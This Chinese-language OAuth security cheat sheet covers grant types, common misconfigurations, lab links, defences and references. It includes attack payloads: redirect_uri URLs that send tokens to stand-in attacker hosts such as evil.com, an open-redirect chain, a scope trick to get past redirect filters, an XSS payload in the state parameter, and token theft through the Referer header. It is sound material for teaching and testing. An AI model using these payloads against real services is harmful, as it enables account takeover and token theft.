# OAuth 配置错误

> OAuth 是一个广泛使用的授权框架，允许第三方应用程序在不暴露用户凭据的情况下访问用户数据。然而，OAuth 的不当配置和实现可能导致严重的安全漏洞。本文档探讨了常见的 OAuth 配置错误、潜在的攻击向量以及缓解这些风险的最佳实践。

## OAuth 安全原理

OAuth 是一个开放标准授权框架，它允许用户授权第三方应用访问其存储在另一个服务提供者上的信息，而无需将用户名和密码提供给第三方应用。

### OAuth 2.0 授权流程

1. **授权码授权（Authorization Code Grant）**：
   - 适用于有后端的 Web 应用
   - 通过重定向获取授权码
   - 使用授权码交换访问令牌

2. **隐式授权（Implicit Grant）**：
   - 适用于纯前端应用
   - 直接返回访问令牌
   - 安全性较低，不推荐使用

3. **密码凭证授权（Resource Owner Password Credentials）**：
   - 用户直接提供凭据给应用
   - 仅适用于受信任的应用
   - 不推荐使用

4. **客户端凭证授权（Client Credentials）**：
   - 适用于服务端到服务端的认证
   - 使用客户端凭据获取令牌

### 常见安全风险

- **令牌泄露**：访问令牌可能通过 Referer 头、日志或客户端存储泄露
- **重定向URI劫持**：攻击者可能劫持授权流程
- **CSRF攻击**：缺乏状态参数可能导致CSRF
- **令牌重放**：令牌可能被截获并重放
- **权限提升**：过大的作用域可能导致权限提升

### 防御措施

- 始终使用 HTTPS
- 验证重定向URI
- 使用 state 参数防止 CSRF
- 限制令牌的作用域和生命周期
- 实施 PKCE（Proof Key for Code Exchange）
- 监控异常活动

## 目录

- [通过referer窃取OAuth令牌](#通过referer窃取oauth令牌)
- [通过redirect_uri获取OAuth令牌](#通过redirect_uri获取oauth令牌)
- [通过redirect_uri执行XSS](#通过redirect_uri执行xss)
- [OAuth私钥泄露](#oauth私钥泄露)
- [授权码规则违反](#授权码规则违反)
- [跨站请求伪造](#跨站请求伪造)
- [实验环境](#实验环境)
- [防御措施](#防御措施)
- [参考资料](#参考资料)

## 通过referer窃取OAuth令牌

> 如果您有HTML注入但无法获得XSS？网站上是否有OAuth实现？如果有，请设置一个指向您服务器的img标签，并查看是否有办法让受害者（通过重定向等方式）在登录后访问，以通过referer窃取OAuth令牌 - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)

## 通过redirect_uri获取OAuth令牌

重定向到受控域名以获取访问令牌

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向到接受的开放URL以获取访问令牌

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth 实现绝不应将整个域名加入白名单，而应只允许特定的URL，这样"redirect_uri"就不能指向开放重定向。

有时您需要将作用域更改为无效的以绕过redirect_uri的过滤器：

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## 通过redirect_uri执行XSS

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth私钥泄露

某些Android/iOS应用可能被反编译，从而泄露OAuth私钥。

## 授权码规则违反

> 客户端不得多次使用授权码。

如果授权码被多次使用，授权服务器必须拒绝该请求，并应撤销（如可能）之前基于该授权码颁发的所有令牌。

## 跨站请求伪造

未在OAuth回调中检查有效CSRF令牌的应用程序容易受到攻击。这可以通过初始化OAuth流程并拦截回调（`https://example.com/callback?code=AUTHORIZATION_CODE`）来利用。此URL可用于CSRF攻击。

> 客户端必须为其重定向URI实现CSRF保护。这通常通过要求发送到重定向URI端点的任何请求包含一个将请求绑定到用户代理认证状态的值来实现。客户端在发出授权请求时应使用"state"请求参数将此值传递给授权服务器。

## 实验环境

- [PortSwigger - 通过OAuth隐式流绕过身份验证](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
- [PortSwigger - 强制OAuth配置文件链接](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
- [PortSwigger - 通过redirect_uri劫持OAuth账户](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- [PortSwigger - 通过代理页面窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
- [PortSwigger - 通过开放重定向窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## 防御措施

1. **安全配置**
   - 验证所有重定向URI
   - 实施精确的URI匹配，而非子域匹配
   - 避免使用通配符或正则表达式

2. **令牌安全**
   - 使用短期访问令牌
   - 实现令牌撤销机制
   - 使用PKCE增强授权码流

3. **CSRF防护**
   - 始终使用state参数
   - 验证state参数
   - 实现CSRF令牌

4. **安全开发**
   - 遵循OAuth 2.0安全最佳实践
   - 定期进行安全审计
   - 实施速率限制

5. **监控与日志**
   - 记录所有OAuth相关活动
   - 监控异常行为
   - 实施异常检测

## 参考资料

- [所有Paypal OAuth令牌都属于我 - asanso - 2016年11月28日](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
- [OAuth 2 - 我如何再次入侵Facebook（...并本可以窃取有效访问令牌） - asanso - 2014年4月8日](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [我如何再次入侵Github - Egor Homakov - 2014年2月7日](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [微软如何将您的数据交给Facebook...以及其他所有人 - Andris Atteka - 2014年9月16日](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [绕过Periscope管理面板上的Google认证 - Jack Whitton - 2015年7月20日](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)
- [OAuth 2.0 安全最佳实践](https://tools.ietf.org/html/rfc6819)
- [OAuth 2.0 授权框架](https://tools.ietf.org/html/rfc6749)
- [OWASP OAuth 2.0 安全指南](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_2.0_Cheat_Sheet.html)
